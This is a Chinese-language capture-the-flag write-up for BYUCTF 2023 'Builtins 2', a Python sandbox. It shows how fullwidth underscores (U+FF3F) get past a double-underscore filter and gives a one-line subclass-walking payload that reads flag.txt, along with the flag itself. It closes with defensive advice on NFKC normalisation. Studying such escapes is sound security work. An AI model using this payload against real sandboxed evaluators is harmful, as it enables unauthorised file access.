# BYUCTF 2023 - Builtins 2

## 题目简述

服务截取 72 字符，拒绝字面子串 `__`，并在空 `__builtins__` 环境中求值。需要同时绕过双下划线检查和内置函数移除。

## 解题过程

全角低线 `＿`（U+FF3F）在原始输入中不等于 ASCII `_`，所以不会形成被过滤的 `__`；Python 对标识符做 NFKC 规范化后，它又会变成普通下划线。将每个双下划线属性写成“ASCII 下划线 + 全角低线”即可：

```python
()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[124].get_data('.', 'flag.txt')
```

规范化后的属性链与 Builtins 1 相同，最终利用 `FileLoader.get_data` 读取：

```text
byuctf{unicode_is_always_the_solution...}
```

## 方法总结

原始码点黑名单无法替代解释器级规范化。检查危险标识符前必须先 NFKC 归一化；更根本的做法是限制可解析语法与可访问对象，而不是试图穷举 Unicode 同形字符。
